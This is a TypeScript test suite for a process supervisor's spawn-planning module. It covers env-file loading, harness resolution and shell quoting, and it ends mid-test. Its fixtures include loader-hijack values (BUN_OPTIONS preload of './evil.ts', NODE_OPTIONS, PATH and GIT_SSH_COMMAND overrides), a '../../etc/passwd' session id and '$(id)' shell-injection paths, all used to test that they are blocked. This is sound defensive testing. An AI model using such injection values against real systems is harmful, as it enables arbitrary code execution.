import { afterEach, describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  DAEMON_ENTRY_TARGETS,
  SpawnPlanError,
  buildSpawnEnv,
  buildSpawnPlan,
  cliTwin,
  dotenvAssignedNames,
  entryFileFor,
  envFilenamesFor,
  envModeOf,
  findHarnessRoot,
  findSpecPath,
  isInside,
  isSupervisedClass,
  loadEnvChain,
  parseEnvText,
  resolveBundle,
  resolveCrewhausBin,
  runClassFor,
  runKindFor,
  runOptionFlags,
  shellQuote,
} from "./spawn-contracts";

const roots: string[] = [];
function tempHarness(options: { bundle?: string; spec?: boolean; env?: string } = {}): string {
  const dir = mkdtempSync(join(tmpdir(), "chsup-spawn-"));
  roots.push(dir);
  if (options.spec !== false)
    writeFileSync(join(dir, "crewhaus.yaml"), "name: demo\ntarget: cli\n");
  if (options.bundle !== undefined) {
    mkdirSync(join(dir, "dist"), { recursive: true });
    writeFileSync(join(dir, "dist", options.bundle), "// bundle\n");
  }
  if (options.env !== undefined) writeFileSync(join(dir, ".env"), options.env);
  return dir;
}
afterEach(() => {
  for (const dir of roots.splice(0)) rmSync(dir, { recursive: true, force: true });
});

describe("the shape table", () => {
  test("every target maps to its documented run class", () => {
    const expected: Record<string, string> = {
      cli: "interactive",
      browser: "interactive",
      channel: "daemon",
      managed: "daemon",
      // A crew bundle consumes a brief on stdin and exits — a JOB, not a
      // daemon. Classing it `daemon` launched it with no stdin, where its
      // exit 2 read as a crash and walked the backoff ladder.
      crew: "one-shot",
      voice: "daemon",
      batch: "worker",
      workflow: "one-shot",
      graph: "one-shot",
      pipeline: "one-shot",
      research: "one-shot",
      eval: "one-shot",
      onchain: "one-shot",
      "onchain-game": "one-shot",
    };
    for (const [target, runClass] of Object.entries(expected)) {
      expect(runClassFor(target)).toBe(runClass as never);
    }
  });

  test("an unknown target degrades to one-shot (run it, never restart it)", () => {
    expect(runClassFor("some-future-shape")).toBe("one-shot");
  });

  test("only channel/managed/crew/voice have a daemon.ts entry — batch does NOT", () => {
    expect([...DAEMON_ENTRY_TARGETS].sort()).toEqual(["channel", "crew", "managed", "voice"]);
    expect(entryFileFor("batch")).toBe("agent.ts");
    expect(entryFileFor("channel")).toBe("daemon.ts");
    expect(entryFileFor("workflow")).toBe("agent.ts");
  });

  test("batch gets daemon-class supervision despite its agent.ts entry", () => {
    expect(isSupervisedClass(runClassFor("batch"))).toBe(true);
    expect(isSupervisedClass(runClassFor("workflow"))).toBe(false);
    expect(runKindFor("worker")).toBe("daemon");
    expect(runKindFor("one-shot")).toBe("job");
    expect(runKindFor("interactive")).toBe("interactive");
    expect(runKindFor("mcp-server")).toBe("mcp-server");
  });
});

describe("crew: a brief is the input, not a message", () => {
  function crewHarness(): string {
    const dir = mkdtempSync(join(tmpdir(), "chsup-crew-"));
    roots.push(dir);
    writeFileSync(join(dir, "crewhaus.yaml"), "name: pipeline\ntarget: crew\n");
    mkdirSync(join(dir, "dist"), { recursive: true });
    writeFileSync(join(dir, "dist", "daemon.ts"), "// bundle\n");
    return dir;
  }

  test("planning a crew WITHOUT a brief refuses, with the remedy the caller needs", () => {
    const dir = crewHarness();
    let thrown: unknown;
    try {
      buildSpawnPlan({ harnessDir: dir, target: "crew", processEnv: {} });
    } catch (err) {
      thrown = err;
    }
    expect(thrown).toBeInstanceOf(SpawnPlanError);
    expect((thrown as SpawnPlanError).remedy).toBe("submit-brief");
    expect((thrown as Error).message).toContain("daemon submit");
  });

  test("a brief becomes the child's stdin FILE — never argv, which anyone can read", () => {
    const dir = crewHarness();
    const brief = join(dir, "brief.md");
    writeFileSync(brief, "# ship the thing\n");
    const plan = buildSpawnPlan({
      harnessDir: dir,
      target: "crew",
      processEnv: {},
      briefFile: brief,
    });
    expect(plan.stdinFile).toBe(brief);
    expect(plan.argv.join(" ")).not.toContain(brief);
    expect(plan.entry).toBe("daemon.ts");
  });

  test("a crew run is a JOB: never restarted, ledgered as one", () => {
    expect(runClassFor("crew")).toBe("one-shot");
    expect(isSupervisedClass(runClassFor("crew"))).toBe(false);
    expect(runKindFor(runClassFor("crew"))).toBe("job");
  });
});

describe("locating the harness", () => {
  test("the root is the dir holding crewhaus.yaml, even given the bundle dir", () => {
    const dir = tempHarness({ bundle: "agent.ts" });
    expect(findHarnessRoot(join(dir, "dist"))).toBe(dir);
    expect(findSpecPath(dir)).toBe(join(dir, "crewhaus.yaml"));
  });

  test("a dir with no spec anywhere above resolves to itself", () => {
    const dir = tempHarness({ spec: false });
    expect(findHarnessRoot(dir)).toBe(dir);
    expect(findSpecPath(dir)).toBeUndefined();
  });

  test("the bundle is found under dist/, then build/, then the root", () => {
    const dir = tempHarness({ bundle: "daemon.ts" });
    const found = resolveBundle(dir, "channel");
    expect(found?.bundleDir).toBe(join(dir, "dist"));
    expect(found?.entry).toBe("daemon.ts");
    expect(resolveBundle(dir, "cli")).toBeUndefined();
  });

  test("the harness's own CLI wins over PATH", () => {
    const calls: string[] = [];
    expect(
      resolveCrewhausBin("/h", {
        exists: (p) => p === join("/h", "node_modules", ".bin", "crewhaus"),
        realpath: (p) => p,
        which: (c) => {
          calls.push(c);
          return "/usr/local/bin/crewhaus";
        },
      }),
    ).toBe(join("/h", "node_modules", ".bin", "crewhaus"));
    expect(calls).toHaveLength(0);
    expect(
      resolveCrewhausBin("/h", { exists: () => false, which: () => undefined }),
    ).toBeUndefined();
  });

  const local = join("/h", "node_modules", ".bin", "crewhaus");
  const onPath = "/usr/local/bin/crewhaus";

  test("a harness CLI that links outside the harness is passed over for PATH's", () => {
    expect(
      resolveCrewhausBin("/h", {
        exists: (p) => p === local,
        realpath: (p) => (p === local ? "/elsewhere/crewhaus/cli.js" : p),
        which: () => onPath,
      }),
    ).toBe(onPath);
  });

  test("a harness CLI that links inside the harness is used", () => {
    expect(
      resolveCrewhausBin("/h", {
        exists: (p) => p === local,
        realpath: (p) => (p === local ? "/h/node_modules/crewhaus/dist/cli.js" : p),
        which: () => onPath,
      }),
    ).toBe(local);
  });

  test("allowHarnessLocal: false takes PATH's even when the harness has its own", () => {
    expect(
      resolveCrewhausBin("/h", {
        exists: (p) => p === local,
        realpath: (p) => p,
        which: () => onPath,
        allowHarnessLocal: false,
      }),
    ).toBe(onPath);
  });

  test("a sibling directory that only shares the harness's name prefix is outside it", () => {
    expect(
      resolveCrewhausBin("/h", {
        exists: (p) => p === local,
        realpath: (p) => (p === local ? "/h-other/node_modules/crewhaus/cli.js" : p),
        which: () => onPath,
      }),
    ).toBe(onPath);
  });
});

describe("the env chain", () => {
  test("parses dotenv tolerantly", () => {
    const parsed = parseEnvText(
      [
        "# comment",
        "export A=1",
        'B = "two"',
        "C='three'",
        "D=four # trailing",
        "garbage",
        "",
      ].join("\n"),
    );
    expect(parsed).toEqual({ A: "1", B: "two", C: "three", D: "four" });
  });

  test(".env.local wins over .env", () => {
    const dir = tempHarness({ env: "A=one\nB=b\n" });
    writeFileSync(join(dir, ".env.local"), "A=two\n");
    const chain = loadEnvChain(dir);
    expect(chain.vars).toEqual({ A: "two", B: "b" });
    expect(chain.files).toEqual([".env", ".env.local"]);
  });

  test("the harness .env is merged UNDER process.env, and the trace stamps win", () => {
    const dir = tempHarness({ env: "SHARED=from-file\nONLY_FILE=file\nCREWHAUS_TRACE=pretty\n" });
    const { env, envFiles } = buildSpawnEnv({
      harnessRoot: dir,
      processEnv: { SHARED: "from-process", ONLY_PROCESS: "proc" },
    });
    expect(env["SHARED"]).toBe("from-process");
    expect(env["ONLY_FILE"]).toBe("file");
    expect(env["ONLY_PROCESS"]).toBe("proc");
    expect(env["CREWHAUS_TRACE"]).toBe("json");
    expect(env["CREWHAUS_COST_TRACKING"]).toBe("1");
    expect(envFiles).toEqual([".env"]);
  });

  test("relocation variables are honoured AND reported with their source", () => {
    const dir = tempHarness({ env: "CREWHAUS_SESSION_DIR=/elsewhere/sessions\n" });
    const { overrides } = buildSpawnEnv({
      harnessRoot: dir,
      processEnv: { CREWHAUS_WATCHME_ROOT: "/wm" },
      extra: { CREWHAUS_SHARED_DIR: "/shared" },
    });
    expect(overrides).toEqual([
      { name: "CREWHAUS_SESSION_DIR", value: "/elsewhere/sessions", source: "env-file" },
      { name: "CREWHAUS_WATCHME_ROOT", value: "/wm", source: "process" },
      { name: "CREWHAUS_SHARED_DIR", value: "/shared", source: "caller" },
    ]);
  });
});

describe("the env chain reads the files Bun reads, by NODE_ENV", () => {
  /** One file per name, each setting its own marker and a shared `WHO`. */
  function everyModeFile(): string {
    const dir = tempHarness();
    const names = [
      ".env",
      ".env.local",
      ".env.development",
      ".env.development.local",
      ".env.production",
      ".env.production.local",
      ".env.test",
      ".env.test.local",
      ".env.staging",
    ];
    for (const name of names)
      writeFileSync(join(dir, name), `WHO=${name}\nHAS${name.replaceAll(".", "_")}=1\n`);
    return dir;
  }

  test("each mode's files, lowest precedence first", () => {
    expect(envFilenamesFor("development")).toEqual([
      ".env",
      ".env.development",
      ".env.local",
      ".env.development.local",
    ]);
    expect(envFilenamesFor("production")).toEqual([
      ".env",
      ".env.production",
      ".env.local",
      ".env.production.local",
    ]);
    expect(envFilenamesFor("test")).toEqual([".env", ".env.test", ".env.test.local"]);
    expect(envModeOf(undefined)).toBe("development");
    expect(envModeOf("staging")).toBe("development");
    expect(envModeOf("production")).toBe("production");
    expect(envModeOf("test")).toBe("test");
  });

  test("unset: the development files, .env.development.local last", () => {
    const chain = loadEnvChain(everyModeFile(), { sharedFiles: [] });
    expect(chain.files).toEqual([
      ".env",
      ".env.development",
      ".env.local",
      ".env.development.local",
    ]);
    expect(chain.vars["WHO"]).toBe(".env.development.local");
  });

  test("production: the production files", () => {
    const chain = loadEnvChain(everyModeFile(), { sharedFiles: [], nodeEnv: "production" });
    expect(chain.files).toEqual([".env", ".env.production", ".env.local", ".env.production.local"]);
    expect(chain.vars["WHO"]).toBe(".env.production.local");
  });

  test("test: no .env.local, and .env.test.local last", () => {
    const chain = loadEnvChain(everyModeFile(), { sharedFiles: [], nodeEnv: "test" });
    expect(chain.files).toEqual([".env", ".env.test", ".env.test.local"]);
    expect(chain.vars["HAS_env_local"]).toBeUndefined();
    expect(chain.vars["WHO"]).toBe(".env.test.local");
  });

  test("any other NODE_ENV reads the development files", () => {
    const chain = loadEnvChain(everyModeFile(), { sharedFiles: [], nodeEnv: "staging" });
    expect(chain.files).toEqual([
      ".env",
      ".env.development",
      ".env.local",
      ".env.development.local",
    ]);
    expect(chain.vars["HAS_env_staging"]).toBeUndefined();
  });

  test("with no NODE_ENV from the manager, the one .env sets decides; the manager's wins", () => {
    const dir = tempHarness({ env: "NODE_ENV=production\nA=env\n" });
    writeFileSync(join(dir, ".env.production"), "A=production\n");
    writeFileSync(join(dir, ".env.development"), "A=development\n");
    const fromFile = loadEnvChain(dir, { sharedFiles: [] });
    expect(fromFile.files).toEqual([".env", ".env.production"]);
    expect(fromFile.vars["A"]).toBe("production");
    const manager = loadEnvChain(dir, { sharedFiles: [], nodeEnv: "development" });
    expect(manager.files).toEqual([".env", ".env.development"]);
    // The spawn env passes the manager's NODE_ENV to the chain.
    const spawn = buildSpawnEnv({ harnessRoot: dir, processEnv: { NODE_ENV: "test" } });
    expect(spawn.envFiles).toEqual([".env"]);
    expect(spawn.env["A"]).toBe("env");
    expect(spawn.env["NODE_ENV"]).toBe("test");
  });

  test("a harness with only .env reads only .env", () => {
    const dir = tempHarness({ env: "A=1\n" });
    expect(loadEnvChain(dir, { sharedFiles: [] })).toMatchObject({
      vars: { A: "1" },
      files: [".env"],
    });
  });

  test("the compiled daemon runs with Bun's env-file loading off", () => {
    const dir = tempHarness({ bundle: "daemon.ts" });
    const plan = buildSpawnPlan({ harnessDir: dir, target: "channel", processEnv: {} });
    expect(plan.argv[1]).toBe("--no-env-file");
    expect(plan.argv).toEqual(["bun", "--no-env-file", join(dir, "dist", "daemon.ts")]);
  });

  // A real daemon and a real stdio child: the child gets the MCP SDK's default inherited
  // names from the daemon's environment, which is the manager's filtered chain and nothing
  // the daemon loaded itself.
  test.skipIf(process.platform === "win32")(
    "a stdio child of the daemon never sees a PATH a member's .env sets",
    () => {
      const dir = tempHarness();
      const planted = join(dir, "bin");
      writeFileSync(join(dir, ".env"), `PATH=${planted}\nGREETING=hi\n`);
      writeFileSync(join(dir, ".env.development"), "MODE_FILE=1\n");
      mkdirSync(join(dir, "dist"), { recursive: true });
      // The SDK's DEFAULT_INHERITED_ENV_VARS on POSIX, copied: this fixture resolves no
      // workspace package. The stdio child reads no env file of its own.
      writeFileSync(
        join(dir, "dist", "daemon.ts"),
        [
          'const names = ["HOME", "LOGNAME", "PATH", "SHELL", "TERM", "USER"];',
          "const env: Record<string, string> = {};",
          "for (const name of names) {",
          "  const value = process.env[name];",
          '  if (value !== undefined && !value.startsWith("()")) env[name] = value;',
          "}",
          "const child = Bun.spawnSync(",
          '  [process.execPath, "--no-env-file", "-e", "console.log(process.env.PATH ?? String())"],',
          "  { env, cwd: process.cwd() },",
          ");",
          "console.log(JSON.stringify({",
          "  greeting: process.env.GREETING ?? null,",
          "  mode: process.env.MODE_FILE ?? null,",
          "  childPath: child.stdout.toString().trim(),",
          "}));",
        ].join("\n"),
      );
      const plan = buildSpawnPlan({
        harnessDir: dir,
        target: "channel",
        processEnv: {},
        bunBin: process.execPath,
      });
      expect(plan.env["PATH"]).toBeUndefined();
      const run = Bun.spawnSync([...plan.argv], { cwd: plan.cwd, env: plan.env });
      const out = JSON.parse(run.stdout.toString().trim().split("\n").at(-1) ?? "{}") as {
        greeting?: string;
        mode?: string;
        childPath?: string;
      };
      expect(out.greeting).toBe("hi");
      expect(out.mode).toBe("1");
      expect(out.childPath).toBeDefined();
      expect(out.childPath).not.toContain(planted);
    },
    20_000, // two real Bun processes
  );
});

describe("a loader setting an env file names never reaches the child, whatever its value", () => {
  // `processEnv` here is what Bun's own loader put in a manager started in the harness.
  test("a value Bun expanded as it loaded it is still left out", () => {
    const dir = tempHarness({ env: "BUN_OPTIONS=--preload ./evil${NOPE}.ts\n" });
    const spawn = buildSpawnEnv({
      harnessRoot: dir,
      managerCwd: dir,
      processEnv: { PATH: "/usr/bin", BUN_OPTIONS: "--preload ./evil.ts" },
    });
    expect(spawn.env["BUN_OPTIONS"]).toBeUndefined();
    expect(spawn.dropped).toContain("BUN_OPTIONS");
    expect(spawn.env["PATH"]).toBe("/usr/bin");
  });

  test("a file of another mode than the chain reads is checked too", () => {
    const dir = tempHarness({ env: "NODE_ENV=production\n" });
    writeFileSync(join(dir, ".env.development"), "BUN_OPTIONS=--preload ./evil.ts\n");
    const spawn = buildSpawnEnv({
      harnessRoot: dir,
      managerCwd: dir,
      processEnv: { PATH: "/usr/bin", NODE_ENV: "production", BUN_OPTIONS: "--preload ./evil.ts" },
    });
    expect(spawn.envFiles).not.toContain(".env.development");
    expect(spawn.env["BUN_OPTIONS"]).toBeUndefined();
    expect(spawn.dropped).toContain("BUN_OPTIONS");
  });

  test("the env files of the directory the manager started in are checked", () => {
    const dir = tempHarness();
    const managerCwd = mkdtempSync(join(tmpdir(), "chsup-manager-"));
    roots.push(managerCwd);
    writeFileSync(join(managerCwd, ".env.local"), "  export GIT_SSH_COMMAND : ./ssh.sh\r\n");
    const spawn = buildSpawnEnv({
      harnessRoot: dir,
      managerCwd,
      processEnv: { GIT_SSH_COMMAND: "./ssh.sh", LD_PRELOAD: "/opt/lib.so" },
    });
    expect(spawn.env["GIT_SSH_COMMAND"]).toBeUndefined();
    // A loader setting no env file names is the operator's own, and passes.
    expect(spawn.env["LD_PRELOAD"]).toBe("/opt/lib.so");
    expect(spawn.dropped).toEqual(["GIT_SSH_COMMAND"]);
  });

  test("every spelling of an assignment Bun takes is a name", () => {
    expect([
      ...dotenvAssignedNames(
        "A=1\n  B = 2\nexport C=3\nexport\tD:4\r\nE : 5\n# F=6\nG\nLD_PRELOAD=x",
      ),
    ]).toEqual(["A", "B", "C", "D", "E", "LD_PRELOAD"]);
  });
});

describe("on Windows a loader setting is one name in any letter case", () => {
  const WIN_ENV = "bun_options=--preload ./x.ts\nPath=.\\bin\nNode_Options=--require x\n";
  const MANAGER_PATH = "C:\\Windows\\system32";

  function emptyDir(): string {
    const dir = mkdtempSync(join(tmpdir(), "chsup-manager-"));
    roots.push(dir);
    return dir;
  }

  test("every spelling an env file uses is left out, and the manager's PATH is the one PATH", () => {
    const dir = tempHarness({ env: WIN_ENV });
    const spawn = buildSpawnEnv({
      harnessRoot: dir,
      managerCwd: emptyDir(),
      processEnv: { Path: MANAGER_PATH },
      platform: "win32",
    });
    const names = Object.keys(spawn.env).map((k) => k.toUpperCase());
    expect(names).not.toContain("BUN_OPTIONS");
    expect(names).not.toContain("NODE_OPTIONS");
    const paths = Object.entries(spawn.env).filter(([k]) => k.toUpperCase() === "PATH");
    expect(paths).toEqual([["Path", MANAGER_PATH]]);
    // Named by an env file and left out, as written; the PATH the manager supplies is not.
    expect(spawn.dropped).toEqual(["Node_Options", "bun_options"]);
  });

  test("a manager setting wins over an env file's spelling of the same name", () => {
    const dir = tempHarness({ env: "api_url=http://from-the-file\n" });
    const spawn = buildSpawnEnv({
      harnessRoot: dir,
      managerCwd: emptyDir(),
      processEnv: { API_URL: "http://from-the-manager" },
      platform: "win32",
    });
    const urls = Object.entries(spawn.env).filter(([k]) => k.toUpperCase() === "API_URL");
    expect(urls).toEqual([["API_URL", "http://from-the-manager"]]);
  });

  test("a manager loader setting an env file names in another spelling is left out too", () => {
    const dir = tempHarness({ env: "node_options=--require x\n" });
    const spawn = buildSpawnEnv({
      harnessRoot: dir,
      managerCwd: emptyDir(),
      processEnv: { NODE_OPTIONS: "--require x", Path: MANAGER_PATH },
      platform: "win32",
    });
    expect(Object.keys(spawn.env).map((k) => k.toUpperCase())).not.toContain("NODE_OPTIONS");
    expect(spawn.dropped).toEqual(["NODE_OPTIONS", "node_options"]);
  });

  test("elsewhere names are compared as written", () => {
    const dir = tempHarness({ env: WIN_ENV });
    const spawn = buildSpawnEnv({
      harnessRoot: dir,
      managerCwd: emptyDir(),
      processEnv: { PATH: "/usr/bin" },
      platform: "linux",
    });
    expect(spawn.env["bun_options"]).toBe("--preload ./x.ts");
    expect(spawn.env["Node_Options"]).toBe("--require x");
    expect(spawn.env["PATH"]).toBe("/usr/bin");
    expect(spawn.dropped).toEqual([]);
  });

  test.skipIf(process.platform !== "win32")(
    "a child spawned with the env runs no preload an env file names",
    async () => {
      const dir = tempHarness();
      const marker = join(dir, "preloaded.marker");
      const preloadFile = join(dir, "x.ts");
      writeFileSync(
        preloadFile,
        `require("node:fs").writeFileSync(${JSON.stringify(marker)}, "preloaded");\n`,
      );
      // Bun reads a backslash in an option value as an escape, so the path
      // is written with forward slashes, which Windows accepts.
      const preload = preloadFile.replaceAll("\\", "/");
      writeFileSync(join(dir, ".env"), `bun_options=--preload ${preload}\n`);
      const managerCwd = emptyDir();
      const spawn = buildSpawnEnv({
        harnessRoot: dir,
        managerCwd,
        processEnv: { ...process.env },
      });
      const run = async (env: Record<string, string>): Promise<boolean> => {
        rmSync(marker, { force: true });
        const child = Bun.spawn([process.execPath, "-e", "0"], {
          cwd: managerCwd,
          env,
          stdout: "ignore",
          stderr: "ignore",
        });
        await child.exited;
        return existsSync(marker);
      };
      // The probe can see a preload: the manager's own BUN_OPTIONS runs it.
      expect(await run({ ...spawn.env, BUN_OPTIONS: `--preload ${preload}` })).toBe(true);
      expect(await run(spawn.env)).toBe(false);
    },
    20_000, // two Bun subprocesses on a Windows runner
  );
});

describe("shared fleet env files (manager.envFiles)", () => {
  /** A harness inside a fleet dir that holds the shared `.env`. */
  function fleetHarness(options: {
    shared?: string;
    local?: string;
    declare?: readonly string[];
  }): { fleet: string; dir: string } {
    const fleet = mkdtempSync(join(tmpdir(), "chsup-fleet-"));
    roots.push(fleet);
    const dir = join(fleet, "member");
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "crewhaus.yaml"), "name: member\ntarget: channel\n");
    if (options.shared !== undefined) writeFileSync(join(fleet, ".env"), options.shared);
    if (options.local !== undefined) writeFileSync(join(dir, ".env"), options.local);
    if (options.declare !== undefined) {
      mkdirSync(join(dir, ".crewhaus"), { recursive: true });
      writeFileSync(
        join(dir, ".crewhaus", "settings.json"),
        JSON.stringify({ manager: { envFiles: options.declare } }),
      );
    }
    return { fleet, dir };
  }

  test("a declared shared file loads UNDER the harness-local chain", () => {
    const { dir } = fleetHarness({
      shared: "ANTHROPIC_API_KEY=fleet-key\nSHARED_ONLY=yes\nBOTH=shared\n",
      local: "BOTH=local\n",
      declare: ["../.env"],
    });
    const chain = loadEnvChain(dir);
    expect(chain.vars).toEqual({
      ANTHROPIC_API_KEY: "fleet-key",
      SHARED_ONLY: "yes",
      BOTH: "local",
    });
    expect(chain.files).toEqual(["../.env", ".env"]);
  });

  test("the full chain is reported, shared entries resolved to absolute paths", () => {
    const { fleet, dir } = fleetHarness({ shared: "A=1\n", declare: ["../.env"] });
    expect(loadEnvChain(dir).refs).toEqual([
      { declaredAs: "../.env", path: join(fleet, ".env"), scope: "shared", present: true },
    ]);
  });

  test("a declared-but-absent shared file is REPORTED, not silently skipped", () => {
    const { fleet, dir } = fleetHarness({ declare: ["../.env"] });
    const chain = loadEnvChain(dir);
    expect(chain.vars).toEqual({});
    expect(chain.files).toEqual([]);
    expect(chain.refs).toEqual([
      { declaredAs: "../.env", path: join(fleet, ".env"), scope: "shared", present: false },
    ]);
  });

  test("absolute declarations are taken verbatim; relative ones resolve against the root", () => {
    const { fleet, dir } = fleetHarness({ shared: "A=abs\n" });
    const chain = loadEnvChain(dir, { sharedFiles: [join(fleet, ".env")] });
    expect(chain.vars).toEqual({ A: "abs" });
    expect(chain.refs[0]?.path).toBe(join(fleet, ".env"));
  });

  test("declaration order is precedence order among shared files", () => {
    const { fleet, dir } = fleetHarness({});
    writeFileSync(join(fleet, "base.env"), "K=base\nONLY_BASE=b\n");
    writeFileSync(join(fleet, "over.env"), "K=over\n");
    const chain = loadEnvChain(dir, { sharedFiles: ["../base.env", "../over.env"] });
    expect(chain.vars).toEqual({ K: "over", ONLY_BASE: "b" });
  });

  test("`sharedFiles: []` reads the harness-local chain alone", () => {
    const { dir } = fleetHarness({ shared: "A=1\n", declare: ["../.env"] });
    expect(loadEnvChain(dir, { sharedFiles: [] }).vars).toEqual({});
  });

  test("the shared file reaches the SPAWN env, still under process.env", () => {
    const { dir } = fleetHarness({
      shared: "ANTHROPIC_API_KEY=fleet-key\nOVERRIDDEN=file\n",
      declare: ["../.env"],
    });
    const plan = buildSpawnPlan({
      harnessDir: dir,
      target: "channel",
      processEnv: { OVERRIDDEN: "process" },
      bundle: { bundleDir: dir, entry: "daemon.ts", entryPath: join(dir, "daemon.ts") },
    });
    expect(plan.env["ANTHROPIC_API_KEY"]).toBe("fleet-key");
    expect(plan.env["OVERRIDDEN"]).toBe("process");
    expect(plan.envFiles).toEqual(["../.env"]);
    expect(plan.envFileRefs.map((r) => r.scope)).toEqual(["shared"]);
  });
});

describe("buildSpawnPlan", () => {
  test("cli with a resolvable CLI takes the interpreter path and CAN resume", () => {
    const dir = tempHarness({ bundle: "agent.ts" });
    const plan = buildSpawnPlan({
      harnessDir: dir,
      target: "cli",
      processEnv: {},
      crewhausBin: "/bin/crewhaus",
      options: { resumeSessionId: "sess_0123456789abcdef", model: "sonnet", streaming: true },
    });
    expect(plan.launchMode).toBe("interpreter");
    expect(plan.canResume).toBe(true);
    expect(plan.argv).toEqual([
      "/bin/crewhaus",
      "run",
      join(dir, "crewhaus.yaml"),
      "--model",
      "sonnet",
      "--streaming",
      "--resume",
      "sess_0123456789abcdef",
    ]);
    expect(plan.stdio).toBe("pipe");
    expect(plan.detached).toBe(false);
    expect(plan.supervised).toBe(false);
  });

  test("a malformed session id is never passed through as --resume", () => {
    const dir = tempHarness({ bundle: "agent.ts" });
    const plan = buildSpawnPlan({
      harnessDir: dir,
      target: "cli",
      processEnv: {},
      crewhausBin: "/bin/crewhaus",
      options: { resumeSessionId: "../../etc/passwd" },
    });
    expect(plan.argv).not.toContain("--resume");
  });

  test("cli WITHOUT a CLI falls back to the compiled bundle and cannot resume", () => {
    const dir = tempHarness({ bundle: "agent.ts" });
    const plan = buildSpawnPlan({ harnessDir: dir, target: "cli", processEnv: {} });
    expect(plan.launchMode).toBe("compiled");
    expect(plan.canResume).toBe(false);
    expect(plan.argv).toEqual(["bun", "--no-env-file", join(dir, "dist", "agent.ts")]);
    expect(plan.stdio).toBe("pipe");
  });

  test("a daemon shape is detached, fd-logged, and supervised", () => {
    const dir = tempHarness({ bundle: "daemon.ts" });
    const plan = buildSpawnPlan({
      harnessDir: join(dir, "dist"), // given the BUNDLE dir on purpose
      target: "channel",
      processEnv: {},
      ports: { port: 3000, controlPort: 3001, gatewayPort: 8080 },
      controlToken: "token-value",
      controlTokenPath: join(dir, ".crewhaus", "run", "control-token"),
    });
    expect(plan.runClass).toBe("daemon");
    expect(plan.kind).toBe("daemon");
    expect(plan.detached).toBe(true);
    expect(plan.stdio).toBe("file");
    expect(plan.supervised).toBe(true);
    // cwd is the harness ROOT, never the bundle dir.
    expect(plan.cwd).toBe(dir);
    expect(plan.argv).toEqual(["bun", "--no-env-file", join(dir, "dist", "daemon.ts")]);
    expect(plan.env["PORT"]).toBe("3000");
    expect(plan.env["CREWHAUS_CONTROL_PORT"]).toBe("3001");
    expect(plan.env["CREWHAUS_CONTROL_TOKEN"]).toBe("token-value");
    // The token is stamped into the ENV only — argv is world-readable.
    expect(plan.argv.join(" ")).not.toContain("token-value");
    expect(plan.controlTokenPath).toContain("control-token");
  });

  test("batch runs agent.ts with daemon-class supervision", () => {
    const dir = tempHarness({ bundle: "agent.ts" });
    const plan = buildSpawnPlan({ harnessDir: dir, target: "batch", processEnv: {} });
    expect(plan.runClass).toBe("worker");
    expect(plan.kind).toBe("daemon");
    expect(plan.supervised).toBe(true);
    expect(plan.argv[2]).toBe(join(dir, "dist", "agent.ts"));
  });

  test("a one-shot job is detached, ledgered as a job, and never supervised", () => {
    const dir = tempHarness({ bundle: "agent.ts" });
    const plan = buildSpawnPlan({ harnessDir: dir, target: "workflow", processEnv: {} });
    expect(plan.kind).toBe("job");
    expect(plan.supervised).toBe(false);
    expect(plan.stdio).toBe("file");
  });

  test("the mcp-server class runs `crewhaus serve --mcp`, port-tracked under --sse", () => {
    const dir = tempHarness({ bundle: "agent.ts" });
    const plan = buildSpawnPlan({
      harnessDir: dir,
      target: "cli",
      runClass: "mcp-server",
      processEnv: {},
      crewhausBin: "/bin/crewhaus",
      mcpSse: true,
      ports: { port: 7788 },
    });
    expect(plan.argv).toEqual([
      "/bin/crewhaus",
      "serve",
      "--mcp",
      join(dir, "crewhaus.yaml"),
      "--sse",
      "--port",
      "7788",
    ]);
    expect(plan.kind).toBe("mcp-server");
    expect(plan.launchMode).toBe("cli-verb");
  });

  test("a missing bundle refuses with a Compile remedy instead of a stack trace", () => {
    const dir = tempHarness();
    try {
      buildSpawnPlan({ harnessDir: dir, target: "channel", processEnv: {} });
      throw new Error("expected a SpawnPlanError");
    } catch (err) {
      expect(err).toBeInstanceOf(SpawnPlanError);
      expect((err as SpawnPlanError).remedy).toBe("compile");
      expect((err as SpawnPlanError).message).toContain("daemon.ts");
    }
  });

  test("non-process shapes say so rather than pretending to launch", () => {
    const dir = tempHarness();
    for (const runClass of ["serverless", "export"] as const) {
      expect(() =>
        buildSpawnPlan({ harnessDir: dir, target: "cli", runClass, processEnv: {} }),
      ).toThrow(SpawnPlanError);
    }
  });

  test("the mcp-server class without a CLI names the remedy", () => {
    const dir = tempHarness();
    try {
      buildSpawnPlan({ harnessDir: dir, target: "cli", runClass: "mcp-server", processEnv: {} });
      throw new Error("expected a SpawnPlanError");
    } catch (err) {
      expect((err as SpawnPlanError).remedy).toBe("install-cli");
    }
  });
});

describe("runOptionFlags + cliTwin", () => {
  test("flags render in a stable order", () => {
    expect(
      runOptionFlags({
        streaming: true,
        model: "haiku",
        budgetUsd: 1.5,
        askMode: "pause",
        permissionMode: "auto",
        prompt: "hi",
        trace: "json",
      }),
    ).toEqual([
      "--model",
      "haiku",
      "--prompt",
      "hi",
      "--budget-usd",
      "1.5",
      "--permission-mode",
      "auto",
      "--ask-mode",
      "pause",
      "--trace",
      "json",
      "--streaming",
    ]);
    expect(runOptionFlags({})).toEqual([]);
  });

  test("the CLI twin shows the cwd and the argv, never the env", () => {
    const dir = tempHarness({ bundle: "daemon.ts" });
    const plan = buildSpawnPlan({
      harnessDir: dir,
      target: "channel",
      processEnv: {},
      controlToken: "token-value",
    });
    const twin = cliTwin(plan);
    expect(twin).toContain(`cd ${shellQuote(dir)}`);
    expect(twin).toContain(dir);
    expect(twin).toContain("bun");
    expect(twin).not.toContain("token-value");
  });

  test("the twin single-quotes EVERY word — a path with shell metacharacters is inert", () => {
    // The twin is presented as "the exact command an operator could paste",
    // next to a copy button. A directory name is attacker-influenceable on a
    // shared mount, and the old rule (quote only when it contains a space,
    // with JSON double-quotes) left `$( )`, backticks, `;` and `|` live in
    // both branches.
    const payload = "/srv/harnesses/acct$(id);`id`|id&x";
    const quoted = shellQuote(payload);
    expect(quoted).toBe(`'${payload}'`);
    // Nothing outside the quotes for a shell to interpret.
    expect(quoted.slice(1, -1)).not.toContain("'");

    const withSpace = "/srv/my harness$(id)/h";
    expect(shellQuote(withSpace)).toBe(`'${withSpace}'`);
    // JSON.stringify — the old behaviour — leaves the substitution live.
    expect(JSON.stringify(withSpace)).toContain("$(id)");
    expect(shellQuote(withSpace).startsWith('"')).toBe(false);

